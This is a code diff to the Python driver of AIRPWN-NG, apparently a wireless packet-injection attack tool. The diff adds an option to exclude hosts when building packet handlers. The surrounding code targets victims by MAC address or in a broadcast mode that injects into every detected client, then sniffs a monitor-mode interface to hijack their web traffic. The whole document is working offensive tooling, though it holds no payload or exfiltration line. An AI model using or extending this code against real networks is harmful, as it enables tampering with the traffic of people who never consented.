@@ -78,7 +78,10 @@ def main(args):
 		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
 		if (injection==0):
 			vp=AIRPWN_NG.VictimParameters(websites=websites)
-			ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			if (args.exclude_hosts is None):
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			else:
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp,excluded=args.exclude_hosts)
 			if ("mon" in m_iface):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
@@ -87,7 +90,10 @@ def main(args):
 				snif.threaded_sniff()
 		else:
 			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
-			ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			if (args.exclude_hosts is None):
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			else:
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp,excluded=args.exclude_hosts)
 			if ("mon" in m_iface):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
@@ -109,7 +115,10 @@ def main(args):
 			for victim in args.t:
 				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
 				victims.append(v1)
-			ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			if (args.exclude_hosts is None):
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			else:
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims,excluded=args.exclude_hosts)
 			if ("mon" in m_iface):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
@@ -122,7 +131,10 @@ def main(args):
 			for victim in args.t:
 				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
 				victims.append(v1)
-			ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			if (args.exclude_hosts is None):
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			else:
+				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims,excluded=args.exclude_hosts)
 			if ("mon" in m_iface):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
